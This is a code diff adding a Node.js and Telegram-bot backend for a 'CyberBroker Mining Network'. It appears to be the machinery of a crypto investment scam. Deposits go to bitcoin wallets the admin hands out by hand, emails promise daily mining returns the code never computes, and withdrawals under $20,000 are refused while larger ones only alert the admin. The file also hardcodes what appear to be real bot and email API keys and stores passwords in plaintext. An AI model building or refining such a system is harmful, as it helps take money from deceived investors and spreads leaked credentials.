@@ -1,0 +1,195 @@
+const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
+const cors = require('cors');
+const fs = require('fs');
+const { Resend } = require('resend');
+
+const app = express();
+app.use(express.json());
+app.use(cors());
+
+const TOKEN = '8429782564:AAHKGp2MDsDBxCDr8_EO8in82ELF3Cp244I';
+const ADMIN_CHAT_ID = 7787354299;
+const WITHDRAW_MIN = 20000;
+const RESEND_API_KEY = 're_HNLN33wa_75m97s27BFhSieux5DPa44a6'; // ← YOUR REAL KEY (already inserted)
+
+const bot = new TelegramBot(TOKEN, { polling: true });
+const resend = new Resend(RESEND_API_KEY);
+
+const DATA_FILE = './data.json';
+let data = { users: {}, balances: {}, requests: {}, history: {} };
+
+if (fs.existsSync(DATA_FILE)) {
+  data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+}
+
+function saveData() {
+  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+}
+
+function notifyAdmin(msg) {
+  bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' })
+    .catch(e => console.error('Telegram notify failed:', e));
+}
+
+async function sendEmail(to, subject, html) {
+  if (!to || !to.includes('@') || to === 'anonymous') return;
+  try {
+    await resend.emails.send({
+      from: 'CyberBroker <noreply@cyberbroker-demo.com>', // change to your verified domain later
+      to,
+      subject,
+      html,
+    });
+    console.log(`Email sent to ${to}: ${subject}`);
+  } catch (e) {
+    console.error('Resend email failed:', e);
+  }
+}
+
+// ── Telegram incoming messages (admin replies with wallet) ───────────
+bot.on('message', (msg) => {
+  const chatId = msg.chat.id;
+  const text = (msg.text || '').trim();
+
+  if (chatId === ADMIN_CHAT_ID && text.toLowerCase().startsWith('wallet ')) {
+    const wallet = text.slice(7).trim();
+    const pendingUser = Object.keys(data.requests).find(u => data.requests[u]?.status === 'pending');
+    if (pendingUser) {
+      data.requests[pendingUser].wallet = wallet;
+      data.requests[pendingUser].status = 'wallet_sent';
+      saveData();
+      notifyAdmin(`Wallet sent to *${pendingUser}*: ${wallet}`);
+    }
+  }
+});
+
+// ── API Endpoints ────────────────────────────────────────────────────
+app.post('/api/register', async (req, res) => {
+  const { username, password, email } = req.body;
+  if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
+  if (data.users[username]) return res.status(400).json({ error: 'Username taken' });
+
+  data.users[username] = { password, email: email || 'anonymous' };
+  data.balances[username] = 0;
+  data.history[username] = [];
+  saveData();
+
+  notifyAdmin(`New registration:\n• *${username}*\n• Email: ${email || 'anonymous/temporary'}`);
+
+  if (email && email.includes('@')) {
+    await sendEmail(
+      email,
+      'Welcome to CyberBroker Mining Network',
+      `<h2>Hello ${username},</h2>
+       <p>Your private mining account is now active.</p>
+       <p>Next step: log in and make your first deposit to start earning daily returns.</p>
+       <p>— CyberBroker Team</p>`
+    );
+  }
+
+  res.json({ success: true });
+});
+
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  if (data.users[username]?.password === password) {
+    res.json({ success: true, balance: data.balances[username] || 0 });
+  } else {
+    res.status(401).json({ error: 'Invalid credentials' });
+  }
+});
+
+app.post('/api/deposit-request', (req, res) => {
+  const { username, amount, method } = req.body;
+  if (!data.users[username]) return res.status(400).json({ error: 'User not found' });
+
+  data.requests[username] = { amount: Number(amount), method, status: 'pending', time: new Date().toISOString() };
+  saveData();
+
+  notifyAdmin(
+    `New deposit request:\n` +
+    `• User: *${username}*\n` +
+    `• Amount: *$${Number(amount).toLocaleString()}*\n` +
+    `• Method: *${method}*\n\n` +
+    `Reply with: \`wallet bc1q...\` to approve and send wallet`
+  );
+
+  res.json({ success: true });
+});
+
+app.get('/api/get-wallet', (req, res) => {
+  const { username } = req.query;
+  const reqData = data.requests[username];
+  res.json({ wallet: reqData?.wallet || null });
+});
+
+app.post('/api/confirm-deposit', async (req, res) => {
+  const { username, amount } = req.body;
+  const reqData = data.requests[username];
+  if (!reqData || reqData.status !== 'wallet_sent') return res.status(400).json({ error: 'No pending wallet confirmation' });
+
+  data.balances[username] = (data.balances[username] || 0) + Number(amount);
+  reqData.status = 'confirmed';
+  saveData();
+
+  const newTier = getTier(data.balances[username]);
+
+  notifyAdmin(
+    `Deposit CONFIRMED:\n` +
+    `• User: *${username}*\n` +
+    `• Amount: *$${Number(amount).toLocaleString()}*\n` +
+    `• New balance: *$${data.balances[username].toLocaleString()}*\n` +
+    `• New tier: *${newTier}*`
+  );
+
+  const userEmail = data.users[username]?.email;
+  if (userEmail && userEmail.includes('@') && userEmail !== 'anonymous') {
+    await sendEmail(
+      userEmail,
+      'Your Deposit is Confirmed – Mining Active',
+      `<h2>Great news, ${username}!</h2>
+       <p>Your deposit of <strong>$${Number(amount).toLocaleString()}</strong> has been confirmed.</p>
+       <p>New balance: <strong>$${data.balances[username].toLocaleString()}</strong></p>
+       <p>Your mining tier is now: <strong>${newTier}</strong></p>
+       <p>Daily returns are now accruing automatically.</p>
+       <p>— CyberBroker Team</p>`
+    );
+  }
+
+  res.json({ success: true, balance: data.balances[username], tier: newTier });
+});
+
+app.post('/api/withdraw-request', (req, res) => {
+  const { username, amount } = req.body;
+  const bal = data.balances[username] || 0;
+
+  if (amount > bal) return res.status(400).json({ error: 'Insufficient balance' });
+  if (amount < WITHDRAW_MIN) {
+    return res.status(400).json({ error: `Minimum withdrawal is $${WITHDRAW_MIN.toLocaleString()}. You haven't reached the limit yet.` });
+  }
+
+  notifyAdmin(
+    `WITHDRAWAL REQUEST:\n` +
+    `• User: *${username}*\n` +
+    `• Amount: *$${Number(amount).toLocaleString()}*\n` +
+    `• Current balance: *$${bal.toLocaleString()}*`
+  );
+
+  res.json({ success: true, message: 'Withdrawal request sent to admin for review' });
+});
+
+function getTier(bal) {
+  if (bal >= 500000) return "VVIP (Mars)";
+  if (bal >= 100000) return "Falcon Heavy";
+  if (bal >= 25000) return "Dojo Operator";
+  if (bal >= 7000) return "Starlink Pilot";
+  if (bal >= 3000) return "Cyber Novice";
+  return "X Teslas";
+}
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Backend running on port ${PORT}`);
+  notifyAdmin('Backend server started • Ready for requests');
+});
